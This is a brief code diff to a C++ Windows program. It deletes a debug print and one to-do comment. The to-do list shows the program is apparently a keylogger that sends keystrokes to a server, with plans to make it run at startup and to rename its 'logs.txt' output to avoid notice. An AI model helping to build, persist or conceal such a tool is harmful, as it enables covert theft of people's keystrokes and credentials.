@@ -78,7 +78,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
             }
         }
     }
-    std::cout << "yella";
 }
 
 /*
@@ -87,7 +86,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
         To-Do list
 
-    ~ figure out why client is sending additional junk data to the server. (writekeystroke function)
     ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
     ~ write code to schedule this program to be run on startup.
     ~ change keystroke generated filename from logs.txt to something else.
